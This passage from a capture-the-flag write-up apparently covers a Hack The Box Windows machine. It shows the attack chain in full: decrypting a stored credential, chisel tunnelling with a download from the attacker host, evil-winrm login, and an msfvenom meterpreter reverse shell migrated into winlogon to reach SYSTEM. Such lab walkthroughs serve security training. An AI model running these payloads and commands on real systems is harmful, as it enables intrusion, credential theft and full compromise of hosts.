$password = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6" | ConvertTo-SecureString
$credential = New-Object System.Management.Automation.PSCredential($username, $password)
$credential.GetNetworkCredential().password
```

With prints the password in plaintext. Thus we got creds: `alaading:f8gQ8fynP44ek1m3`

## Escalate to alaading

Loging in with credentials is bit complicated in Windows. One possiblity is to use *RunAs* tools, which are rather tricky. The other possibility is WinRM.

And WinRM is indeed present. Check it with:

```
Test-WSMan localhost
```

However, the WinRM port is not open. To resolve it, we can use Chisel to create a tunnel.

### Chisel

Download the chisel

```
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
```

Extract and upload to the host.

Now run chisel server on attacker

```
chisel server -p 8000 --reverse
```

On victim, get the chisel binary and connect

```
curl 10.10.14.41/chisel.exe -OutFile chisel.exe
.\chisel.exe client 10.10.14.41:8000 R:5985:127.0.0.1:5985
```

Now use EvilRM to login.

```
evil-winrm -i 127.0.0.1 -u 'alaading' -p 'f8gQ8fynP44ek1m3'
```

And that's enought for the flag.

## Escalate to administrator

First, check the priviledges with `whoami /priv`

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeDebugPrivilege              Debug programs                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

We are in luck! `SeDebugPrivilege` is pretty dangerous to have. See: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#sedebugprivilege However, I was not able to abuse it :/

### Meterpreter

As an alternative solution, we can use meterpreter, which can migrate to a different process.

Resources:

* https://medium.com/@jbtechmaven/ethical-hacking-reverse-shell-attack-using-metasploit-57e9cd400c88
* https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html

First, generate payload

```
msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe LHOST=10.10.14.41 LPORT=7777 -o payload.exe
```

Now upload it to victim. Since I am working on Evil-WinRM, I can just use

```
upload payload.exe
```

Now, run the metasploit console

```
msfconsole
...
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.10.14.41
lhost => 10.10.14.41
msf6 exploit(multi/handler) > set lport 7777
lport => 7777
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.41:7777 
[*] Sending stage (201798 bytes) to 10.10.11.251
[*] Meterpreter session 1 opened (10.10.14.41:7777 -> 10.10.11.251:49754) at 2024-05-30 23:02:33 +0200
```

Now, find process to migrate to

```
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User          Path
 ---   ----  ----               ----  -------  ----          ----
 0     0     [System Process]
 4     0     System             x64   0
 88    4     Registry           x64   0
 248   624   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 292   4     smss.exe           x64   0
 340   624   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 356   624   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 376   368   csrss.exe          x64   0
 480   368   wininit.exe        x64   0
 488   472   csrss.exe          x64   1
 552   472   winlogon.exe       x64   1                      C:\Windows\System32\winlogon.exe
 ...
```

Winlogon is fine. It is quite persistent and it is system process. And migrate...

```
meterpreter > migrate 552
[*] Migrating from 1956 to 552...
[*] Migration completed successfully.
```

Now run `shell`

```
meterpreter > shell
Process 1704 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

And that's enought to grab the flag!